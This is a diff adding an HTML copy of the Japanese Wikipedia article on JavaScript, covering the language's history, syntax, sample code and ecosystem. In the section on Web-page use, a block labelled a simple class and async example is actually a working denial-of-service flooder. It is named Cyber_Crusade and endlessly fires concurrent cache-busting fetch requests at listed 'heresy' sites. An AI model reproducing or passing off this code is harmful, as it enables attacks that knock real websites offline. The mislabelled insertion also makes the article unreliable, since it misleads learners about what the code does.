@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="scroll_basic.js"></script>
+</head>
+<body>
+<div id="main">
+<pre>
+<div id="chap_0">
+
+メインメニュー
+
+Wikipedia
+検索
+アカウント作成
+ログイン
+
+個人用ツール
+
+目次の表示・非表示を切り替え
+JavaScript
+
+ページ
+ノート
+閲覧
+編集
+履歴表示
+</div>
+<div id="chap_1">
+ツール
+出典: フリー百科事典『ウィキペディア（Wikipedia）』
+ウィキペディア	ウィキペディアにおける各利用者のJavaScriptの使用法については、「Wikipedia:カスタムJS」をご覧ください。
+曖昧さ回避	「Java」とは異なります。
+JavaScript
+JavaScript
+logo.jsによるJavaScriptの非公式ロゴ
+パラダイム	マルチパラダイム
+登場時期	1995年 (29年前)
+設計者	ブレンダン・アイク
+開発者	ネットスケープコミュニケーションズ、Mozilla Foundation
+最新リリース	ECMAScript 2023[1] ウィキデータを編集/ 2023年6月 (9か月前)
+評価版リリース	ECMAScript 2025[2] ウィキデータを編集 / 2024年2月28日 (17日前)
+型付け	ダック・タイピング
+主な処理系	JavaScriptCore、KJS、Nitro、Rhino、SpiderMonkey、V8ほか
+方言	JScript
+影響を受けた言語	Scheme、Self、Java、Lua、Perl、AWK、HyperTalk、Python 
+影響を与えた言語	Dart、Objective-J（フランス語版）、Google Apps Script、TypeScript
+プラットフォーム	クロスプラットフォーム
+ウェブサイト	www.ecma-international.org/publications-and-standards/standards/ecma-262/ ウィキデータを編集
+拡張子	.js、.cjs、.mjs
+テンプレートを表示
+
+HTML中のJavaScript。scriptタグで囲まれている。
+JavaScript（ジャバスクリプト）は、プログラミング言語であり、HyperText Markup Language（HTML）やCascading Style Sheets（CSS）と並ぶ　World Wide Web（WWW）の中核技術の一つである。
+
+プロトタイプベースのオブジェクト指向スクリプト言語であるが、クラスなどのクラスベースに見られる機能も取り込んでいる。
+
+利用される場面はウェブサイト、ウェブアプリケーション、バックエンド、デスクトップアプリケーション、モバイルアプリケーションなど、ウェブブラウザからサーバ、デスクトップからスマートフォンまで多岐にわたっている。
+
+Javaと似た名称を持つが、異なるプログラミング言語である（#歴史を参照）。
+</div>
+<div id="chap_2">
+概要
+JavaScriptはWebブラウザNetscape Navigatorに起源を持ち、現在では様々な用途に利用されるプログラミング言語である。
+
+JavaScriptの言語仕様はECMAScriptとして標準化され、実装は各種のJavaScriptエンジンによって提供されている。JavaScriptエンジンの例としてChromium系ブラウザのV8、Mozilla FirefoxのSpiderMonkey、SafariのJavaScriptCoreが挙げられる。
+
+言語仕様を定義するECMAScriptのほかに、WebブラウザへアクセスするためのAPI仕様にDOMなどがある。これらはECMAScriptから独立しており、JavaScriptからも独立した概念である。
+
+プログラミング言語としての特徴
+JavaScriptは以下のような様々なスタイルのプログラミングが可能である。
+
+if・forなどの制御構造による手続き型プログラミングスタイル
+.prototype・classなどのオブジェクトによるオブジェクト指向プログラミングスタイル
+map・高階関数などの関数操作による関数型プログラミングスタイル
+これらを可能にしているプログラミング言語としての特徴に、以下のことが挙げられる。オブジェクト指向の面では、JavaScriptのオブジェクトはクラスベースではなくプロトタイプベースである[注釈 1]。関数型の面では、第一級関数をサポートし関数を第一級オブジェクトとして扱える。
+
+AptanaやEclipse, NetBeans, IntelliJ IDEAなどの統合開発環境はJavaScriptをサポートしており、大規模開発が可能になっている。さらにExt JSなどの本格的なGUIライブラリの登場により、デスクトップアプリケーションと遜色ないユーザインタフェースの構築が可能になった。
+
+並行処理
+JavaScriptではしばしば、ネットワークを介したリクエストのような "待ち" がある処理を行う[注釈 2]。これに対処するために非同期処理をサポートし並行処理が可能となる。標準で用意されている処理機能にも非同期処理されるものがある。
+
+非同期処理を記述する方法としてコールバック関数がある。JavaScriptはコールバック関数記法をラップするPromise、Promiseを同期的なコードのように記述できるAsync/await構文をもつ。
+
+またJavaScriptは並列処理による並行処理もサポートしている（下記参照）。
+
+並列処理
+JavaScriptでは複数スレッドを用いた並列処理が可能である。共有メモリ上のバッファを表現するSharedArrayBuffer、バッファ操作オブジェクトAtomicsが定義されている。スレッドそのものの仕様は環境ごとに異なる（ECMAScriptでは定義されていない）。ブラウザの場合はWorker、Node.jsの場合はworker_threadsで定義されている。ただこの2環境ではほぼ共通の仕組みとなっており、例えばpostMessageによるメッセージングが両者でサポートされている。
+
+歴史
+誕生
+JavaScriptはネットスケープコミュニケーションズのブレンダン・アイクによって、1995年5月に10日間で開発された。上司からの指示に「Javaのような外観にしてくれ」「初心者に優しく」「Netscapeブラウザのほとんどなんでも制御できるように」との注文があった[3]。Netscape Navigator 2.0で実装された。
+
+開発当初はLiveScriptと呼ばれていたが、1995年にサン・マイクロシステムズ（現・オラクル）が開発したプログラミング言語Javaが当時大きな注目を浴びており、ネットスケープとサン・マイクロシステムズが業務提携していた事もあったため、JavaScriptという名前に変更された[4][5]。最初のJavaScriptエンジンはブレンダン・アイクによりNetscape Navigatorのために作成されたものであった。このエンジンはSpiderMonkeyと呼ばれており、C言語で実装されていた。また、全てJavaで記述されたJavaScriptエンジンであるRhinoも同じくNetscapeのNorris Boyd（後にGoogleに移籍）らにより作成された。
+
+1996年にマイクロソフトのInternet Explorer 3.0にJScriptという名前で搭載されるようになると、その手軽さからJavaScriptは急速に普及していく。1997年、通信に関する標準を策定する国際団体EcmaインターナショナルによってJavaScriptの中核的な仕様がECMAScriptとして標準化され[6]、多くのウェブブラウザで利用できるようになった。
+
+ネットスケープは、ウェブアプリケーション開発言語として自社のサーバ製品に実装したLiveWire JavaScriptも発表したが[5]、こちらはあまり普及しなかった。
+
+JavaScriptの登場初期は、ブラウザベンダー間で言語仕様の独自拡張が行われていたため、ブラウザ間の互換性が極めて低かった。ECMAScriptの策定以降は実装間の互換性は向上し、DOMなど関連仕様の実装に関する互換性も高くなっていった。
+
+かつてはJavaScriptという言葉が「ECMAScript標準」を指す、あるいは「独自実装を含んだ広義のJavaScript」を指し幅広い意味で使われていた。ゆえにどちらの意味でJavaScriptという言葉が使われているかは文脈で判断する必要があった[7]。たとえばかつてマイクロソフトによる実装はJScriptと呼ばれたが、JScriptをJavaScriptと呼ぶような場面があった。
+
+ECMAScriptは仕様自体に独自の拡張を条件付きで認める記述があり[8]、ブラウザが実装しているスクリプト言語はすべてECMAScriptに準拠していることになる。広義の意味でこれをJavaScriptと呼ぶ場合、主要なブラウザが実装しているスクリプト言語はマイクロソフトやGoogle、Appleの実装も含めてJavaScriptである。
+
+実装間での差異を吸収するためにPrototype JavaScript Frameworkなどのライブラリが用いられた。
+</div>
+<div id="chap_3">
+発展
+市場のブラウザ間互換性がある程度確立された2000年ごろには、GoogleやAmazonなどのGAFAMもJavaScriptを積極的に利用し始めた。
+
+また、JavaScriptはウェブブラウザの拡張機能を開発するための言語としても使われるようになった。当初は拡張機能用のAPIが統一されていなかったが、互換性を高めようとする動きがある[9]。
+
+当初はインタプリタ方式で実行されることが一般的であったためJavaScriptの実行速度はさほど速くなかったが、現在ではJITコンパイルなどを利用した各種の最適化がなされており、各ウェブブラウザのベンダーともに高速化を図ってしのぎを削っている。さらには、この高速化を受ける形で、Node.jsのようにサーバサイドでもJavaScriptを使う動きが見られるようになった。
+
+JavaScript 2.0
+次世代のJavaScriptとして、"JavaScript 2.0" を作ろうとした動きは2度あったが、いずれもまとまらなかった。
+
+1度目はECMAScript 3が完成したのち2000年から2003年にかけて発生したが、ネットスケープとマイクロソフトの対立でまとまらなかった。当時ネットスケープが提案していた案はアドビのActionScript 2.0に引き継がれ、マイクロソフトの案はJScript .NETへと引き継がれた。
+
+その後もネットスケープ及びMozilla FoundationはECMAScriptの策定に並行してJavaScriptを拡張し、JavaScript 1.x系列としてバージョンアップを繰り返していた。ECMAScript側ではECMAScript 4の策定が1999年以降進められており[10]、2006年の時点でMozilla Foundationはこれに基づいてJavaScript 2.0を作成することを表明していた。MozillaはECMAScript 4の策定にあたって、Pythonの文法を一部取り込んだ案を提案しており、自身でもこれを実装していた[11]。
+
+しかしその後、ECMAScriptの標準化作業がMozilla, Adobe, Opera, Googleらが推す ECMAScript 4 と、Microsoft, Yahoo! らが推す ECMAScript 3.1 に事実上分裂してしまった影響から、2008年8月に大きな方針転換があり、ECMAScript 4は破棄され後者がECMAScript 5として2009年に標準化された。ECMAScript 4に入る予定だった機能は新たに発足した「ECMAScript Harmony」に先送りとなった[12]。これは後にECMAScript 2015として標準化が完了した。
+
+なお、ECMAScript 5が標準化されて以降、MozillaのJavaScript実装はECMAScriptへの準拠を謳うようになった[13]。そしてバージョン番号での呼称は行われなくなり、JavaScript 2.0は事実上死語となった。
+</div>
+<div id="chap_4">
+文法
+詳細は「JavaScriptの文法（英語版） 」を参照
+基本的な文法
+JavaScriptの変数は var[14], let[15]およびconst[16] キーワードを使用して宣言できる。
+
+let x; // 変数xの宣言。値が未指定のため、特殊な値である undefined が入った状態となる。
+let y = 2; // 変数yの宣言。同時に 2 が代入される。
+const z = 5; // 定数zの宣言。同時に 5 が代入される。定数であるため、書き換えることはできない。
+上記例のスラッシュ2文字以降はコメントである。
+
+JavaScriptは言語仕様にI/Oが組み込まれておらず、それらは実行環境により提供される。ECMAScript 5.1の仕様では以下のように言及されている。[17]
+
+この仕様の中では外部データの入力または計算結果の出力は供給しない。
+(… indeed, there are no provisions in this specification for input of external data or output of computed results.)
+
+しかし、ほとんどの実行環境はConsole Standard[18]で規定されている console オブジェクトを持っており[19]、そこにコンソール出力を行える。以下に最小のHello worldプログラムを示す。
+
+console.log("Hello World!");
+再帰関数は以下のように書ける。
+
+function factorial(n) {
+    if (n == 0) {
+        return 1;
+    }
+    return n * factorial(n - 1);
+}
+無名関数（またはラムダ式）の構文とクロージャの例は以下である。
+
+// ECMAScript 5以前の記法
+var displayClosure = function() {
+    let count = 0;
+    // ECMAScript 2015以降で可能な記法
+    return ()=> {
+        return ++count;
+    };
+}
+var inc = displayClosure();
+inc(); // 1 が返る
+inc(); // 2 が返る
+inc(); // 3 が返る
+可変長引数は以下のように記述する[20]。
+
+var sum = function(...args) {
+    let x = 0;
+    for (const v of args) {
+        x += v;
+    }
+    return x;
+}
+sum(1, 2, 3); // 6 が返る
+即時実行関数式 (IIFE) の例。関数を用いることで変数をクロージャに閉じ込めることができる。
+
+var v;
+v = 1;
+var getValue = (function(v) {
+  return function() {return v;};
+})(v);
+
+v = 2;
+
+getValue(); // 1 が返る
+複雑な例
+以下のサンプルコードは、様々なJavaScriptの機能を示したものである。
+
+"use strict"; // strictモードの宣言
+/* 2つの数値の最小公倍数を求める */
+function LCMCalculator(x, y) { // コンストラクタ関数
+    const checkInt = (x)=> { // 入れ子の関数
+        if (x % 1 !== 0) {
+            throw new TypeError(x + " is not an integer"); // 例外のスロー
+        }
+        return x;
+    };
+    //   行末のセミコロンは省略可能な場合があるが、省略は推奨されない。
+    this.a = checkInt(x)
+    this.b = checkInt(y);
+}
+// オブジェクトのプロトタイプはコンストラクタ関数の prototype プロパティに格納する
+LCMCalculator.prototype = { // オブジェクトリテラル
+    constructor: LCMCalculator, // このようにプロトタイプを上書きする場合は、
+                                // constructorプロパティにコンストラクタ関数名を再指定する
+    gcd: function () { // 最大公約数を計算するメソッド
+        // 「ユークリッドの互除法」アルゴリズムで計算
+        let a = Math.abs(this.a), b = Math.abs(this.b);
+        if (a < b) {
+            // 変数の入れ替え
+            const t = b;
+            b = a;
+            a = t;
+        }
+        while (b !== 0) {
+            const t = b;
+            b = a % b;
+            a = t;
+        }
+        // 最大公約数の計算は一度でよいため、自分自身を計算済みの結果を返すメソッドで再定義（上書き）する。
+        // （これにより LCMCalculator.prototype.gcd の代わりに this.gcd が呼ばれるようになる。
+        //   ただし、計算後にプロパティ a や b が変更されてしまうと、結果は誤りとなる。）
+        // なお 'gcd' === "gcd", this['gcd'] === this.gcd である。
+        this['gcd'] = function () {
+            return a;
+        };
+        return a;
+    },
+    lcm : function () { // 最小公倍数を計算するメソッド
+        // 変数名は、オブジェクトのプロパティと衝突しない。例）lcm は this.lcm とは異なる。
+        // 以下では、浮動小数の精度の問題を避けるために this.a * this.b としていない。
+        const lcm = this.a/this.gcd()*this.b;
+        // 最小公倍数の計算も一度でよいため、自分自身を計算済みの結果を返すメソッドで再定義（上書き）する。
+        this.lcm = function () {
+            return lcm;
+        };
+        return lcm;
+    },
+    toString: function () { // toStringはオブジェクトを文字列に変換するときに呼ばれるメソッド。
+        // テンプレート文字列により文字列中に値を埋め込むことができる。
+        return `LCMCalculator: a = ${this.a}, b = ${this.b}`;
+    }
+};
+
+// 汎用の出力関数の定義。この実装はWebブラウザ上でのみ動作する。
+function output(x) {
+    document.body.appendChild(document.createTextNode(x));
+    document.body.appendChild(document.createElement('br'));
+}
+
+// 無名関数はさまざまな書き方が可能
+[[25, 55], [21, 56], [22, 58], [28, 56]].map(([a, b])=> new LCMCalculator(a, b)) // 配列リテラル + マッピング関数
+.sort((a, b)=> a.lcm() - b.lcm()) // 指定した比較関数を用いたソート
+.forEach(obj=> {
+    output(obj + ", gcd = " + obj.gcd() + ", lcm = " + obj.lcm());
+});
+上記コードをウェブブラウザ上で実行すると、以下の結果が表示される。
+
+LCMCalculator: a = 28, b = 56, gcd = 28, lcm = 56
+LCMCalculator: a = 21, b = 56, gcd = 7, lcm = 168
+LCMCalculator: a = 25, b = 55, gcd = 5, lcm = 275
+LCMCalculator: a = 22, b = 58, gcd = 2, lcm = 638
+機能
+グローバルオブジェクト
+JavaScriptはコードの最上階層に属するグローバルオブジェクトを提供している。JavaScriptにおけるグローバルオブジェクトはglobalThisである[21]。
+</div>
+<div id="chap_5">
+エコシステム
+実行環境API
+それぞれのJavaScript実行環境において様々なAPIが存在しており、JavaScriptからそれらを呼び出すことができる。
+
+Webブラウザ
+HTML要素をJavaScriptから操作するためのDOM API（例: document.querySelector）、HTTPリクエストを送信するFetch API、マルチスレッドを可能にするWorkerなどが定義されている。これらは言語仕様であるECMAScriptからは独立した各々の仕様書でAPIが定義され、ブラウザ実装がJavaScriptバインディングを提供することでJavaScriptからの呼び出しが可能になっている。
+
+Node.js
+ファイルシステムにアクセスするためのfs API（モジュール）や実行プロセスと相互作用するprocess APIなどが定義されている。Webブラウザがもつ強いサンドボックス要件が緩和されている点がNode.js APIの特徴の1つである。
+</div>
+<div id="chap_6">
+altJS
+alternative JavaScript (altJS) はJavaScriptへトランスパイルされるプログラミング言語の総称である。
+
+JavaScriptへ新たな機能を追加する方法の1つに、新しい言語を定義しそのコードをJavaScriptへ変換する方法がある。そのようなJavaScriptへトランスパイルされる言語はaltJSと総称される。altJSの例としてCoffeeScriptやTypeScript、PureScriptが挙げられる。altJSを用いることで、新たな演算子や記法を導入し効率の良いJavaScript開発を行うことができる。素のJavaScriptはaltJSと対比してVanilla JSとしばしば呼ばれる[22]。
+
+例えばTypeScriptは型の導入を可能にする。JavaScriptは動的型付けである。静的コード解析でJavaScriptコードへの型検査は実行可能だが、コード上に型表記をおこなうことはできない。altJSの1つであるTypeScriptはJavaScriptへ型ノーテーションを導入しトランスパイル時に型検査をおこなうことで、型をもったJavaScriptを実現している。
+
+パッケージ管理
+JavaScriptエコシステムには多様なライブラリ（パッケージ）が存在する。パッケージの導入・バージョン調整・廃棄を担う管理ソフトウェアとしてnpmやyarnがある。
+
+利用
+WebブラウザにおけるHTML操作を目的として作られたJavaScriptは、2020年現在幅広い領域で利用されている。
+
+ウェブページ・ウェブサイト・ウェブアプリケーション（ブラウザクライアント上での動作）
+ウェブバックエンドサーバ (Node.js)
+デスクトップアプリケーション（例: Electron (ソフトウェア)）
+モバイルアプリケーション (例: React Native)
+Webページでの利用
+「ダイナミックHTML」、「Ajax」、および「Document Object Model」も参照
+JavaScriptの最も歴史の長い使用法はHTMLページにクライアント側のふるまいを持たせることである。これは当初はダイナミックHTML (DHTML) として知られていた。JavaScriptはHTMLに直接埋め込まれまたは別のファイルからインクルードされ、Webブラウザ上のJavaScript実行環境で動作する。Webブラウザは通常、Document Object Model (DOM) を扱うためのホストオブジェクトを提供する。
+
+JavaScriptの使用例としては、以下のようなものがある。
+
+ページの再読み込みなしで新しいコンテンツを読み込むまたはサーバに投稿する（Ajax。例えば、SNSでページを離れることなく新しい投稿を表示することができる）。
+ゲームなどの動的なコンテンツを提供する。
+データをサーバーに送信せずにフォーム入力値の検証（英語版）を行う。
+アクセス解析や広告追跡（英語版）、パーソナライゼーションなどのためにユーザーの閲覧情報を収集する[23]。
+JavaScriptはユーザーのブラウザ上で動作できることから、ユーザーの操作に対して素早く反応することができ、アプリケーションをよりレスポンシブにすることができる。さらにJavaScriptはHTML単独では対応できない操作、例えばキー入力などにも応答することができる。Gmailのようなアプリケーションでは、JavaScriptでUIロジックを実装し、さらにJavaScriptでサーバから情報（例えばeメールのメッセージ）を取得することで、こうしたメリットを享受している。このような利点からAjaxは大きなトレンドとなった[要出典]。
+
+様々な言語やフレームワークをウェブブラウザ上で動作させるために、JavaScriptはそれらのコンパイル先出力言語となっている（例: TypeScript）。
+
+例
+以下はJavaScriptとDOMを含むWebページのごく単純な例である。
+
+<!DOCTYPE html>
+<html>
+    <meta charset="utf-8">
+    <title>単純な例</title>
+    
+    <body>
+        <h1 id="header">これはJavaScriptです</h1>
+        
+        <script>
+            document.body.appendChild(document.createTextNode('Hello World!'));
+        
+            var h1 = document.getElementById('header'); // id='header'の<h1>要素の参照を取得。
+            h1 = document.getElementsByTagName('h1')[0]; // または<h1>要素を全て取得してそこから先頭を取得。
+        </script>
+        
+        <noscript>表示中のブラウザはJavaScriptをサポートしていないか、OFFになっています。</noscript>
+    </body>
+</html>
+登場当初は、htmlの補助的なスクリプトとして、クラスや非同期処理などの処理が貧弱であったが、近年のWebアプリケーションの浸透に伴い、様々な機能が拡張された。 現在では、クラスの作成や非同期処理など、C#やJavaでなければ実装できなかったものも手軽に実装できるようになっている。以下はクラスや非同期処理のごく単純な実装例である。
+
+// クラス名
+class Cyber_Crusade {
+
+  // コンストラクタ
+  constructor(limit) {
+    // 1秒ごとの送信頻度を設定
+    this.CONCURRENCY_LIMIT = limit;
+    // 非同期関数を定義
+    this.fetchWithTimeout = this.fetchWithTimeout.bind(this);   // リクエスト送信。
+    this.punish_heterodoxy = this.punish_heterodoxy.bind(this); // 各サイトにデータリクエストを送る。
+  }
+
+  // 対象のサイトを指定
+  heresy_sites = {
+       'https://example.com/': { number_of_requests: 0, number_of_errored_responses: 0 },   
+       'https://www.example.com/': { number_of_requests: 0, number_of_errored_responses: 0 },  
+  };
+
+  // 1秒ごとの送信頻度
+  CONCURRENCY_LIMIT = 1000;
+  queue = [];
+
+  // リクエスト送信
+  async fetchWithTimeout(resource, options) {
+    // コントローラーを取得
+    const controller = new AbortController();
+    // IDを取得
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    // リクエスト処理を返す。
+    return fetch(resource, {
+      method: 'GET',              // GET方式
+      mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
+      signal: controller.signal   // オブジェクトのインスタンスを返
+    }).then((response) => {       // 成功した場合
+      clearTimeout(id);			  // タイムアウトを消す。
+      return response;			  // 応答結果を返す。
+    }).catch((error) => {		  // 失敗した場合
+      console.log(error.code);    // エラーコードを出力
+      clearTimeout(id);			  // タイムアウトを消す。
+      throw error;				  // エラーを投げる。
+    });
+  }
+
+  // 各ターゲットにデータ送信する。
+  async punish_heterodoxy(target) {
+    //for文を使った無限ループ
+    for (var i = 0;; ++i) {
+      // リクエストの数が規定数になったら
+      if (this.queue.length > this.CONCURRENCY_LIMIT) {
+        // 最初のリクエストを削除する。
+        await this.queue.shift()
+      }
+      // 乱数を生成
+      var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      // 送信リクエストを追加する。
+      this.queue.push(
+        // 関数を実行する(時間制限：1秒)
+        this.fetchWithTimeout(target+rand, { timeout: 1000 })
+          // エラーがある場合はエラーを取得する。
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            this.heresy_sites[target].number_of_errored_responses++;
+          })
+          // 処理後の処理をする。
+          .then((response) => {
+            // エラーがある場合はエラー処理を入れる。
+            if (response && !response.ok) {
+              this.heresy_sites[target].number_of_errored_responses++;
+            }
+            // リクエスト数を追加する。
+            this.heresy_sites[target].number_of_requests++;
+          })
+      )
+    }
+  }       
+  // 実行関数
+  inquisitio(){
+   // 全てのターゲット要素に対してデータ送信処理を実行する。
+   Object.keys(this.heresy_sites).map(this.punish_heterodoxy);
+  }
+}
+
+// オブジェクト呼び出し
+var cyber_crusade = new Cyber_Crusade(500);
+// 実行
+cyber_crusade.inquisitio();
+その他の環境での利用
+ウェブブラウザ以外のJavaScript実行環境も存在する（サーバーサイドJavaScript実装の一覧（英語版）を参照）。データベースやWebサーバに組み込まれ、それらのAPIやHTTPリクエストやレスポンスのアクセスが提供されているものもある。
+
+また、Node.jsのようにOSの機能（ネットワークやファイルシステムなど）にアクセスできる環境も存在する。加えてElectronなどのアプリケーションフレームワークの登場により、Atomなどのアプリケーションが広まりつつある。
+
+いくつかのアプリケーションではマクロ言語としても採用されている。例えばAdobe Acrobatは、JavaScriptによるマクロ機能を搭載している。
+
+バージョンとブラウザの対応表
+「ECMAScript#バージョン」も参照
+バージョン	日付	規格	Netscape
+Navigator	Mozilla
+Firefox	Internet
+Explorer	Opera	Safari
+1.0	1996年3月		2.0		3.0		
+1.1	1996年8月		3.0				
+1.2	1997年7月		4.0-4.05				
+1.3	1998年10月	ECMA-262 1st edition / ECMA-262 2nd edition	4.06-4.7x		4.0	5.0	
+1.4			Netscape
+Server			6.0	
+1.5	2000年11月	ECMA-262 3rd edition	6.0	1.0	5.5 (JScript 5.5),
+6.0 (JScript 5.6),
+7.0 (JScript 5.7),
+8.0 (JScript 6.0)		
+1.6	2005年11月	1.5 + Array extras + Array and String generics + E4X	7.0-8.0	1.5		7.0-9.0	3.0, 3.1
+1.7	2006年10月	1.6 + Pythonic generators + Iterators + let		2.0			3.2-5.1
+1.8	2008年7月	1.7 + Generator expressions + Expression closures		3.0			
+1.8.1		1.8 + Minor Updates		3.5			
+1.9		1.8.1 + ECMAScript 5[24] Compliance		4.0-11.0			
+[25]
+
+ライブラリ
+代表的なJavaScriptライブラリは以下のとおり。
+
+AngularJS
+Backbone.js
+Dojo Toolkit
+Express.js
+Ext JS
+Google Web Toolkit (GWT)
+Impact
+jQuery
+MochiKit
+MooTools
+Prototype JavaScript Framework (prototype.js)
+QUnit
+Yahoo!ユーザーインターフェイスライブラリ
+WinJS
+React
+Vue.js
+脚注
+[脚注の使い方]
+注釈
+^ 新しい (ES2015以降) JavaScriptではクラスの構文によりプロトタイプを意識せずにオブジェクト指向プログラミングをすることが可能になったが、言語設計はプロトタイプベースの設計を維持している。
+^ もしも待ちの間にプログラムを停止/sleep させると、その間に他の処理をそのスレッドで行うことが出来ない（ブロッキング）。もしネットワークリクエストが返ってくるまでブロッキングしたとすると、その間ブラウザのレンダリングも停止してしまう。
+出典
+^ “ECMAScript® 2023 Language Specification” (6月 2023). 2 3月 2024閲覧。
+^ “ECMAScript® 2025 Language Specification” (28 2月 2024). 2 3月 2024閲覧。
+^ Effective JavaScript（翔泳社、2013）iii。
+^ Marc Andreessen. “INNOVATORS OF THE NET: BRENDAN EICH AND JAVASCRIPT”. 2008年7月4日時点のオリジナルよりアーカイブ。2008年1月22日閲覧。
+^ a b “NETSCAPE AND SUN ANNOUNCE JAVASCRIPT, THE OPEN, CROSS-PLATFORM OBJECT SCRIPTING LANGUAGE FOR ENTERPRISE NETWORKS AND THE INTERNET”. 2008年5月28日時点のオリジナルよりアーカイブ。2008年1月22日閲覧。
+^ ECMA 262, ISO/IEC 16262, JIS X 3060
+^ JavaScript 第5版（オライリー・ジャパン、2007）P2。
+^ ECMA-262 第5版 2.Conformance
+^ WebExtensions, Browser Extensions
+^ ECMAScript® 2017 Language Specification (ECMA-262, 8th edition, June 2017) Introduction
+^ “Python and JavaScript” (英語). Brendan's Roadmap Updates (2006年2月19日). 2010年1月25日時点のオリジナルよりアーカイブ。2007年9月5日閲覧。
+^ 後藤大地 (2008年8月18日). “JavaScript 2.0はECMAScript 3.1ベースに、ECMAScript 4は譲歩”. マイナビニュース. 2013年3月1日時点のオリジナルよりアーカイブ。2022年4月11日閲覧。
+^ “Mozilla における ECMAScript 5 のサポート”. 2021年4月20日時点のオリジナルよりアーカイブ。2022年4月11日閲覧。
+^ “var – JavaScript – MDN”. The Mozilla Developer Network. 2012年12月22日閲覧。
+^ “let – JavaScript – MDN”. The Mozilla Developer Network. 2018年1月24日閲覧。
+^ “const – JavaScript – MDN”. The Mozilla Developer Network. 2018年1月24日閲覧。
+^ “ECMAScript Language Specification – ECMA-262 Edition 5.1”. Ecmaインターナショナル. 2012年12月22日閲覧。
+^ “Console Living Standard” (英語). WHATWG (2017年5月18日). 2017年5月24日閲覧。
+^ “console”. Mozilla Developer Network. Mozilla. 2013年4月6日閲覧。
+^ “[https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters Rest parameters - JavaScript]”. Mozilla Developer Network. Mozilla. 2018年1月24日閲覧。
+^ 2020-04-10現在 tc39 stage-4 (finished proposal). ECMAScript2020へ採用予定 tc39
+^ “Vanilla JS”. vanilla-js.com. 2020年6月16日時点のオリジナルよりアーカイブ。2021年9月4日閲覧。
+^ “JavaScript tracking – Piwik”. Piwik. 2012年3月31日閲覧。
+^ 後藤大地 (2009年12月9日). “JavaScriptのブラウザ非互換に解決のみとおし”. journal.mycom.co.jp. 2009年12月9日閲覧。
+^ John Resig. “Versions of JavaScript”. Ejohn.org. 2009年5月19日閲覧。
+関連項目
+
+ウィキブックスにJavaScript関連の解説書・教科書があります。
+
+ウィキメディア・コモンズには、JavaScriptに関連するカテゴリがあります。
+JSON（JavaScript Object Notation）- JavaScriptにおけるオブジェクトの記法をベースとした軽量なデータ記述言語。
+Category:JavaScriptを生成する言語も参照。
+外部リンク
+英語
+JavaScript - MDN
+Standard ECMA-262
+日本語
+JavaScript - MDN
+JavaScript講座 - リズムファクトリー社
+JScript - Microsoft
+表話編歴
+JavaScript
+表話編歴
+ECMAScript
+表話編歴
+コンピュータ・プログラミング言語
+典拠管理データベース ウィキデータを編集
+カテゴリ: JavaScriptスクリプト言語ウェブ開発ウェブサイトの構成
+最終更新 2024年3月16日 (土) 10:24 （日時は個人設定で未設定ならばUTC）。
+テキストはクリエイティブ・コモンズ 表示-継承ライセンスのもとで利用できます。追加の条件が適用される場合があります。詳細については利用規約を参照してください。
+プライバシー・ポリシーウィキペディアについて免責事項行動規範開発者統計Cookieに関する声明モバイルビューWikimedia FoundationPowered by MediaWiki
+</div>
+</pre>    
+</div>
+</body>
+</html>
